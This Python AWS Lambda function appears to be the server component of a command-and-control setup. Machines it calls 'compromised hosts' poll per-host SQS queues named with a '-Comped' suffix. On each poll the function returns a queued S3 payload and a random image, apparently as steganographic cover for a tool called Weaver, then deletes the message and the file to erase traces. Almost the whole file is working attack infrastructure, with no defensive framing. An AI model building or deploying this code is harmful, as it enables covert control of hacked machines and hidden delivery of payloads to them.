import json, boto3, base64, random, os

# This is the API that the compromised host hits in order to see if there are any images to pull down
def lambda_handler(event, context):
    sqs = boto3.client('sqs')
    s3 = boto3.client('s3')

    try:
        jsonEvent = json.loads(event['body'], strict=False)
        # This except has to exist for testing
    except:
        jsonEvent = event

    results = []
    hostname = jsonEvent['hostname']
    bucket = os.environ['BUCKET']

    # Get the queue for the host
    try:
        response = sqs.get_queue_url (
            QueueName = hostname + '-Comped'
        )
        queueUrl = response['QueueUrl']
        results.append('Successfully received the queueURL')
    except Exception as error:
        return {
        'statusCode': 404,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps(str(error))
      }
    
    # Get attributes from the queue to see if it is empty or not
    response = sqs.get_queue_attributes (
        QueueUrl = queueUrl,
        AttributeNames = [
            'ApproximateNumberOfMessages'
        ]
    )
    
    # Get messages that are in the queue
    if '0' not in response['Attributes']['ApproximateNumberOfMessages']:
        try:
            response = sqs.receive_message (
                QueueUrl = queueUrl,
                MaxNumberOfMessages=1,
                MessageAttributeNames=[
                    'All'
                    ]
            )
            # Place the data from the messages
            key = response['Messages'][0]['MessageAttributes']['Path']['StringValue']
            receiptHandle = response['Messages'][0]['ReceiptHandle']
        except Exception as error:
            return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps(str(error))
        }
        
        # Get the object and send it back to the host. From there, delete the object
        try:
            response = s3.get_object (
                Bucket = bucket,
                Key = key
            )
            baseBodyType = response['ContentType']
            bodyBytes = response['Body'].read()
            baseBody = base64.b64encode(bodyBytes).decode("utf-8")

            # Get a random image for Weaver to use
            response = s3.list_objects(
                Bucket = bucket
            )

            keys = {}

            for i in response['Contents']:
                if 'images/' in i['Key']:
                    keys.update({i['Key']:'temp'})
            
            randomNum = random.randint(0, len(keys)-1)
            
            response = s3.get_object (
                Bucket = bucket,
                Key = list(keys)[randomNum]
            )
            randBytes = response['Body'].read()
            randBody = base64.b64encode(randBytes).decode("utf-8")

            body = {'body': baseBody, 'randImage':randBody, 'fileType':baseBodyType}

            # Delete the message
            response = sqs.delete_message (
                QueueUrl = queueUrl,
                ReceiptHandle = receiptHandle
            )
            # Delete the file
            s3.delete_object (
                Bucket = bucket,
                Key=key
            )
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/json'},
                'body': json.dumps(body)
            }
        except Exception as error:
            return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps(str(error))
        }
    else:
        return {
        'statusCode': 200,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps('No messages in the queue')
    }
        

# JSON request for get
'''
{
    "hostname": "hostname"
}
'''

# From the SQS Queue
'''
{
    'Path' : {
        'DataType': 'String',
        'StringValue': s3Info
    }
}
'''